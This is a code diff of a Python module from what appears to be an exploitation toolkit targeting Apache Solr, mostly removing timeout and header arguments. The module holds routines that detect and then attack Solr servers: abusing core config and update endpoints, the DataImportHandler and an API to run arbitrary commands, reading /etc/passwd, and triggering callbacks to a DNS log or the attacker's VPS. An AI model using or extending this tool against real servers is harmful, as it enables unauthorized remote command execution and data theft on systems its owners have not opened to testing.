@@ -14,12 +14,9 @@ class ApacheSolr():
         self.cmd = env.get('cmd')
         self.pocname = env.get('pocname')
         self.vuln = env.get('vuln')
-        self.timeout = int(env.get('timeout'))
-        self.retry_time = int(env.get('retry_time'))
-        self.retry_interval = int(env.get('retry_interval'))
         self.flag = GlobalVar.get_value('flag')
-        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo {}'.format(self.flag))
-        self.linux_cmd = env.get('cmd', 'echo {}'.format(self.flag))
+        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo ' + self.flag)
+        self.linux_cmd = env.get('cmd', 'echo ' + self.flag)
 
         # Change the url format to conform to the program
         self.getipport = urlparse(self.url)
@@ -37,7 +34,7 @@ class ApacheSolr():
 
         try:
             self.urlcore = self.url+"/solr/admin/cores?indexInfo=false&wt=json"
-            self.request = requests.get(url=self.urlcore, timeout=self.timeout, verify=False)
+            self.request = requests.get(url=self.urlcore)
             self.corename = list(json.loads(self.request.text)["status"])[0]
         except Exception as e:
             self.corename = 'admin'
@@ -84,28 +81,24 @@ class ApacheSolr():
             'Connection': "close",
             'Content-Type': "application/json"
         }
-        headers = {
-            'User-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
-            #'Content-Type' : 'application/x-www-form-urlencoded',
-        }
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
 
         try:
-            request = exprequest.get(url=self.url+"/solr/", headers=headers, timeout=self.timeout, verify=False)
+            request = exprequest.get(url=self.url+"/solr/")
             if request.status_code == 200:
                 get_ver = re.findall(r'img/favicon\.ico\?_=(.*)"', request.text)[0]
                 ver = get_ver.replace(".", "")
-            request = exprequest.get(url=urlcore, headers=headers, timeout=self.timeout, verify=False)
+            request = exprequest.get(url=urlcore)
             try:
                 corename = list(json.loads(request.text)["status"])[0]
             except:
                 pass
-            request = exprequest.post(self.url+"/solr/"+str(corename)+"/config", data=payload1, headers=headers_solr1, timeout=self.timeout, verify=False)
+            request = exprequest.post(self.url+"/solr/"+str(corename)+"/config", data=payload1, headers=headers_solr1)
             if request.status_code == 200 and corename != "null" and int(ver) < 710:
-                request = exprequest.post(self.url+"/solr/"+str(corename)+"/update", data=payload2, headers=headers_solr2, timeout=self.timeout, verify=False)
+                request = exprequest.post(self.url+"/solr/"+str(corename)+"/update", data=payload2, headers=headers_solr2)
                 info = "rce"+" [activemq version: " + get_ver + "]"+" [newcore:"+newcore+"] "
                 return output.echo_success(method, info)
             else:
@@ -138,19 +131,19 @@ class ApacheSolr():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
 
         try:
-            request = exprequest.get(url=urlcore, headers=headers, timeout=self.timeout, verify=False)
+            request = exprequest.get(url=urlcore)
             try:
                 corename = list(json.loads(request.text)["status"])[0]
             except:
                 pass
             urlconfig = self.url+"/solr/"+str(corename)+"/admin/mbeans?cat=QUERY&wt=json"
             # check solr mode: "solr.handler.dataimport.DataImportHandler"
-            request = exprequest.get(url=urlconfig, headers=headers, timeout=self.timeout, verify=False)
+            request = exprequest.get(url=urlconfig)
             urlcmd = self.url+"/solr/"+str(corename)+"/dataimport"
-            request = exprequest.post(urlcmd, data=payload, headers=headers, timeout=self.timeout, verify=False)
+            request = exprequest.post(urlcmd, data=payload)
             if request.status_code==200 and corename!="null":
                 info = "rce"+" [corename:"+str(corename)+"]"
                 return output.echo_success(method, info)
@@ -172,10 +165,10 @@ class ApacheSolr():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
 
         try:
-            request = exprequest.get(url=urlcore, timeout=self.timeout, verify=False)
+            request = exprequest.get(url=urlcore)
             try:
                 corename = list(json.loads(request.text)["status"])[0]
             except:
@@ -197,15 +190,15 @@ class ApacheSolr():
             """
             #_verify
             if self.vuln == 'False':
-                request = exprequest.post(urlapi, data=set_api_data, headers=headers_json, timeout=self.timeout, verify=False)
+                request = exprequest.post(urlapi, data=set_api_data, headers=headers_json)
                 if request.status_code == 200 and corename != None:
                     return output.echo_success(method, info)
                 else:
                     return output.fail()
             #_attack
             else:
-                request = exprequest.post(urlapi, data=set_api_data, headers=headers_json, timeout=self.timeout, verify=False)
-                request = exprequest.get(self.url+"/solr/"+str(corename)+payload_2, timeout=self.timeout, verify=False)
+                request = exprequest.post(urlapi, data=set_api_data, headers=headers_json)
+                request = exprequest.get(self.url+"/solr/"+str(corename)+payload_2)
                 print(request.text)
         except Exception as error:
             return output.error_output(str(error))
@@ -229,12 +222,12 @@ class ApacheSolr():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
 
         try:
             #_verify
             if self.vuln == 'False':
-                request = exprequest.get(self.url + path.format(self.corename,'/etc/passwd'), data=payload, headers=headers, timeout=self.timeout, verify=False)
+                request = exprequest.get(self.url + path.format(self.corename,'/etc/passwd'), data=payload)
                 if r"root:" in request.text or r"系统找不到" in request.text:
                     return output.echo_success(method, info)
                 else:
@@ -242,7 +235,7 @@ class ApacheSolr():
                     return output.fail()
             #_attack
             else:
-                request = exprequest.get(self.url + path.format(self.corename,self.cmd), data=payload, headers=headers, timeout=self.timeout, verify=False)
+                request = exprequest.get(self.url + path.format(self.corename,self.cmd), data=payload)
                 print(request.text)
         except Exception as error:
             return output.error_output(str(error))
@@ -270,7 +263,7 @@ class ApacheSolr():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
 
         try:
             #_verify
@@ -278,14 +271,14 @@ class ApacheSolr():
                 dnslog = Dnslog()
                 domain = dnslog.dns_host()
                 for path in paths:
-                    exprequest.get(self.url + path.replace('DOMAIN', domain), headers=headers, timeout=self.timeout, verify=False)
+                    exprequest.get(self.url + path.replace('DOMAIN', domain))
                     if dnslog.result():
                         return output.echo_success(method, self.url + path)
                 return output.fail()
             #_attack
             else:
                 for path in paths:
-                    exprequest.get(self.url + path.replace('DOMAIN', self.cmd), headers=headers, timeout=self.timeout, verify=False)
+                    exprequest.get(self.url + path.replace('DOMAIN', self.cmd))
                 print('[*]请在vps上查看利用结果!')
         except Exception as error:
             return output.error_output(str(error))
@@ -315,6 +308,7 @@ def check(**kwargs):
                 thread_list.append(kwargs['pool'].submit(getattr(ExpApacheSolr, func)))
     #保存全局子线程列表
     GlobalVar.add_value('thread_list', thread_list)
+
 
 
 
